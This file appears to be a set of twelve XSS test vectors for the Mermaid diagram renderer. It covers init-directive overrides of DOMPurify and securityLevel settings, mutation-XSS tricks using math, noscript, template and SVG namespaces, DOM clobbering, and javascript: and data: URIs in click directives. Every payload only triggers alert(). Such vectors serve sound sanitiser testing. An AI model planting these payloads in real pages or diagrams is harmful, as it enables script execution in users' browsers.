# Mermaid XSS Test Vectors

## Test 1: Init directive override (dompurifyConfig)

```mermaid
%%{init: {"dompurifyConfig": {"ADD_TAGS": ["img"], "ADD_ATTR": ["onerror"]}}}%%
flowchart LR
    A["<img src=x onerror=alert(document.domain)>XSS-TEST-1"]
```

## Test 2: Init directive securityLevel override (should be blocked by secure array)

```mermaid
%%{init: {"securityLevel": "loose"}}%%
flowchart LR
    A["<img src=x onerror=alert(document.domain)>XSS-TEST-2"]
```

## Test 3: Namespace confusion - math/mtext/table mXSS

```mermaid
flowchart LR
    A["<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></table>XSS-TEST-3"]
```

## Test 4: SVG namespace switch

```mermaid
flowchart LR
    A["<svg><foreignObject><div><img src=x onerror=alert(1)></div></foreignObject></svg>XSS-TEST-4"]
```

## Test 5: Style injection (allowed by Ta)

```mermaid
flowchart LR
    A["<style>*{background:red !important}</style>STYLE-TEST-5"]
```

## Test 6: Click directive with javascript URI

```mermaid
flowchart LR
    A[Test Click]
    click A href "javascript:alert(1)" _top
```

## Test 7: Click directive with data URI

```mermaid
flowchart LR
    B[Test Data URI]
    click B href "data:text/html,<script>alert(1)</script>" _top
```

## Test 8: noscript/noembed re-contextualization mXSS

```mermaid
flowchart LR
    A["<noscript><p title='</noscript><img src=x onerror=alert(1)>'>XSS-TEST-8"]
```

## Test 9: DOMPurify clobbering via ID

```mermaid
flowchart LR
    A["<form id=DOMPurify><img src=x onerror=alert(1)>XSS-TEST-9"]
```

## Test 10: xlink:href on SVG use

```mermaid
flowchart LR
    A["<svg><use href='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>alert(1)</script></svg>'></use></svg>XSS-TEST-10"]
```

## Test 11: Template element bypass

```mermaid
flowchart LR
    A["<template><img src=x onerror=alert(1)></template>XSS-TEST-11"]
```

## Test 12: Mutation via details/summary

```mermaid
flowchart LR
    A["<details open ontoggle=alert(1)><summary>Click</summary></details>XSS-TEST-12"]
```
